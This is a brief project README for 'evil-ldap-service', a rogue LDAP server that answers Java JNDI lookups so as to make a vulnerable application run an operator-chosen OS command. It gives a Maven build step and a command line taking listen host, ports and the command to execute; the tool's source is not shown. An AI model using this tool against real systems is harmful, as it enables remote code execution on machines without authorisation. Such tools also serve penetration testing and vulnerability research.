# evil-ldap-service
Simplified LDAP service to answer a Java deserialiazed JNDI lookup. 

## What's simulate 

![alt text](https://github.com/sciccone/evil-ldap-service/blob/master/doc/evil-ldap-service.png)

## Usage

`mvn install`

`java -jar target/evil-ldap-service-jar-with-dependencies.jar -l <LISTEN_HOST> -lp <LDAP_PORT> -hp <HTTP_PORT> -c <OS_COMMAND>`
